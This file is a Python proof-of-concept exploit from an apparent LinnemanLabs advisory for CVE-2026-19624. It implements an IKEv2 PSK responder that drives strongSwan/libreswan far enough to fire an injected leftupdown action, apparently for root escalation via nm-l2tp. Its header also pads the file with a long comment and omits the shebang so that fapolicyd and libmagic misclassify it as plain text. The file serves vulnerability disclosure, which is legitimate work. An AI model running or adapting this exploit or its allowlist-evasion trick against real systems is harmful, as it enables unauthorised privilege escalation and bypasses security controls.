# no shebang to avoid mime-type fingerprint, run with "python3 nm-l2tp-responder.py"
#
# LinnemanLabs - nm-l2tp PoC - minimal IKEv2 PSK responder
#
# https://linnemanlabs.com/posts/nm-l2tp-newline-to-root
# https://github.com/linnemanlabs/advisories/
#
# CVE-2026-19624
#
# nm-l2tp-responder: minimal userland IKEv2 PSK responder.
#
# Sets up an IKE responder that will satisfy strongSwan/libreswan far enough that
# it runs the injected leftupdown action. We complete IKE_SA_INIT + IKE_AUTH and
# never touch the kernel. Everything after authentication is dropped.
#
# Runs as unprivileged user.
#
# env vars: POC_BIND(127.0.0.2) POC_PORT(5500) POC_PSK(linnemanlabs-poc) POC_ID(127.0.0.2)
#
##########################################################################################
# if we leave the shebang off of this script and just make a really long comment here,
# fapolicyd will not scan far enough looking for content to match on and give this a type.
#
# the try: ... except: block matches but libmagic only scans 4096 bytes looking for it.
# libmagic scans 8192 for the def lines, so we do need to pad past there.
#
# so this is going to be a really long comment to make it give up and call it text/plain.
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ########################################################################################
# ok that should be long enough now, back to the real script
import socket, struct, os, hashlib, hmac, sys

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    def aes_cbc(key, iv, data, encrypt=True):
        op = (Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor() if encrypt
              else Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor())
        return op.update(data) + op.finalize()
except ImportError:
    import subprocess
    def aes_cbc(key, iv, data, encrypt=True):
        cmd = ["openssl", "enc", "-aes-128-cbc", "-nopad", "-K", key.hex(), "-iv", iv.hex()] + ([] if encrypt else ["-d"])
        r = subprocess.run(cmd, input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if r.returncode: raise RuntimeError("openssl: " + r.stderr.decode()[:200])
        return r.stdout

BIND = os.environ.get("POC_BIND", "127.0.0.2")
PORT = int(os.environ.get("POC_PORT", "5500"))
PSK  = os.environ.get("POC_PSK", "linnemanlabs-poc").encode()
MYID = bytes(int(x) for x in os.environ.get("POC_ID", "127.0.0.2").split("."))

# MODP-2048
# who doesnt like a good scary looking blob in their exploit?
P = int("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74"
        "020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374"
        "FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE"
        "386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598D"
        "A48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED5"
        "29077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E7"
        "72C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497"
        "CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
G = 2

def prf(k, m): return hmac.new(k, m, hashlib.sha256).digest()
def prfplus(k, s, n):
    t = b""; out = b""; i = 1
    while len(out) < n: t = prf(k, t + s + bytes([i])); out += t; i += 1
    return out[:n]
def pl(nxt, body): return bytes([nxt, 0]) + struct.pack(">H", 4 + len(body)) + body

def walk(data, first):
    nxt = first; off = 0; out = []
    while nxt != 0 and off + 4 <= len(data):
        this = nxt; nxt = data[off]
        ln = struct.unpack(">H", data[off+2:off+4])[0]
        if ln < 4 or off + ln > len(data): break
        out.append((this, data[off+4:off+ln]))
        off += ln
    return out

def xf_has_cbc(xf):
    off = 0
    while off + 8 <= len(xf):
        tlen = struct.unpack(">H", xf[off+2:off+4])[0]
        if tlen < 8 or off + tlen > len(xf): return False
        if xf[off+4] == 1 and struct.unpack(">H", xf[off+6:off+8])[0] == 12: return True
        if xf[off] == 0: return False
        off += tlen
    return False

def select_child(sa_body, our_spi):
    # select a whole offered proposal
    off = 0; first = None; chosen = None
    while off + 8 <= len(sa_body):
        more = sa_body[off]
        plen = struct.unpack(">H", sa_body[off+2:off+4])[0]
        if plen < 8 or off + plen > len(sa_body): break
        num, proto, spisz, nxf = sa_body[off+4], sa_body[off+5], sa_body[off+6], sa_body[off+7]
        if 8 + spisz > plen: break
        xf = sa_body[off+8+spisz:off+plen]
        cand = (num, proto, nxf, xf)
        if first is None: first = cand
        if xf_has_cbc(xf): chosen = cand; break
        if more == 0: break
        off += plen
    if chosen is None: chosen = first
    if chosen is None: return None
    num, proto, nxf, xf = chosen
    body = bytes([0, 0]) + struct.pack(">H", 8 + len(our_spi) + len(xf)) + bytes([num, proto, len(our_spi), nxf]) + our_spi + xf
    return (num, proto, body)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.bind((BIND, PORT)); s.settimeout(60)
print("[*] nm-l2tp-responder on %s:%d psk=%r id=%s" % (BIND, PORT, PSK.decode(), ".".join(str(b) for b in MYID))); sys.stdout.flush()

# IKE_SA_INIT
d, addr = s.recvfrom(8192)
# strip NAT-T non-ESP marker
mk = d[:4] == b"\x00\x00\x00\x00"; raw = d[4:] if mk else d
# initiator's INIT (for AUTH), marker-stripped
realmsg1 = raw
spii = raw[0:8]; gi = Ni = None
for ptype, body in walk(raw[28:], raw[16]):
    # KE (skip 2B group + 2B resv)
    if ptype == 34: gi = int.from_bytes(body[4:], "big")
    # Nonce
    elif ptype == 40: Ni = body
if gi is None or Ni is None: print("[-] INIT: missing KE/Nonce"); sys.exit(1)
print("[*] INIT: from %s SPIi=%s" % (addr, spii.hex())); sys.stdout.flush()

priv = int.from_bytes(os.urandom(32), "big")
gr = pow(G, priv, P).to_bytes(256, "big")
shared = pow(gi, priv, P).to_bytes(256, "big")
Nr = os.urandom(32); spir = os.urandom(8)
km = prfplus(prf(Ni + Nr, shared), Ni + Nr + spii + spir, 192)
# integ (init, resp)
SK_ai, SK_ar = km[32:64], km[64:96]
# encr  (init, resp)
SK_ei, SK_er = km[96:112], km[112:128]
# auth  (init, resp)
SK_pi, SK_pr = km[128:160], km[160:192]

def tf(last, tt, tid, attr=b""):
    return bytes([0 if last else 3, 0]) + struct.pack(">H", 8+len(attr)) + bytes([tt]) + b"\x00" + struct.pack(">H", tid) + attr
# AES128/SHA256/SHA256-128/DH14
trans = tf(0,1,12,struct.pack(">HH",0x800E,128)) + tf(0,2,5) + tf(0,3,12) + tf(1,4,14)
prop  = bytes([0,0]) + struct.pack(">H", 8+len(trans)) + bytes([1,1,0,4]) + trans
body  = pl(34, prop) + pl(40, struct.pack(">H",14) + b"\x00\x00" + gr) + pl(0, Nr)
realmsg2 = spii + spir + bytes([33,0x20,34,0x20]) + struct.pack(">II",0,28+len(body)) + body
s.sendto((b"\x00\x00\x00\x00" if mk else b"") + realmsg2, addr)

# IKE_AUTH
d, addr = s.recvfrom(8192)
raw = d[4:] if (d[:4] == b"\x00\x00\x00\x00") else d
if hmac.new(SK_ai, raw[:-16], hashlib.sha256).digest()[:16] != raw[-16:]:
    print("[-] AUTH: ICV verify FAILED (SK_ai/offsets wrong)"); sys.exit(1)
inner = None; sk_next = None; nxt = raw[16]; off = 28
while nxt != 0 and off + 4 <= len(raw):
    this = nxt; nxt = raw[off]; ln = struct.unpack(">H", raw[off+2:off+4])[0]
    if ln < 4 or off + ln > len(raw): break
    # SK (encrypted)
    if this == 46:
        # next-payload field = first inner type
        sk_next = nxt
        skb = raw[off+4:off+ln]; iv = skb[:16]; ct = skb[16:-16]
        ptx = aes_cbc(SK_ei, iv, ct, encrypt=False)
        # strip PKCS-style pad (last byte = pad len)
        inner = ptx[:len(ptx)-1-ptx[-1]]
        break
    off += ln
if inner is None: print("[-] AUTH: no SK payload"); sys.exit(1)

idi = auth = sa_child = tsi = tsr = None
for ptype, pbody in walk(inner, sk_next):
    if   ptype == 35: idi = pbody
    elif ptype == 39: auth = pbody
    elif ptype == 33: sa_child = pbody
    elif ptype == 44: tsi = pbody
    elif ptype == 45: tsr = pbody
if idi is None or auth is None: print("AUTH: missing IDi/AUTH"); sys.exit(1)

# verify initiator PSK AUTH: prf( prf(PSK,"Key Pad for IKEv2"), RealMsg1 | Nr | prf(SK_pi, IDi) )
if prf(prf(PSK, b"Key Pad for IKEv2"), realmsg1 + Nr + prf(SK_pi, idi)) != auth[4:]:
    print("[-] AUTH: initiator PSK mismatch (wrong POC_PSK?)"); sys.exit(1)
print("[*] AUTH: initiator PSK verified OK"); sys.stdout.flush()

# ID_IPV4_ADDR
idr = bytes([1,0,0,0]) + MYID
our_auth = prf(prf(PSK, b"Key Pad for IKEv2"), realmsg2 + Ni + prf(SK_pr, idr))
# AUTH method 2 = shared key
auth_body = bytes([2,0,0,0]) + our_auth

child_spi = os.urandom(4)
sel = select_child(sa_child, child_spi) if sa_child else None
if sel:
    num, proto, child_prop = sel
    print("[*] AUTH: child SA - selecting initiator proposal #%d (proto=%d) our SPI=%s" % (num, proto, child_spi.hex())); sys.stdout.flush()
else:
    tr = tf(0,1,12,struct.pack(">HH",0x800E,128)) + tf(0,3,12) + tf(1,5,0)
    child_prop = bytes([0,0]) + struct.pack(">H", 12+len(tr)) + bytes([1,3,4,3]) + child_spi + tr
    print("[*] AUTH: child SA - could not parse initiator SA, using fallback"); sys.stdout.flush()

inner  = pl(39, idr) + pl(33, auth_body)
inner += pl(44 if tsi is not None else 41, child_prop)
if tsi is not None:
    inner += pl(45, tsi) + pl(41, tsr)
inner += pl(0, bytes([0,0]) + struct.pack(">H", 16391))     # N(USE_TRANSPORT_MODE)

iv = os.urandom(16); padl = (16 - ((len(inner)+1) % 16)) % 16
skb = iv + aes_cbc(SK_er, iv, inner + b"\x00"*padl + bytes([padl]), True) + b"\x00"*16
m = bytearray(spii + spir + bytes([46,0x20,35,0x20]) + struct.pack(">II",1,28+4+len(skb)) + pl(36, skb))
m[-16:] = hmac.new(SK_ar, bytes(m[:-16]), hashlib.sha256).digest()[:16]
s.sendto((b"\x00\x00\x00\x00" if mk else b"") + bytes(m), addr)
print("[*] AUTH: responded - initiator should install CHILD_SA and fire leftupdown (verb=up-host)"); sys.stdout.flush()
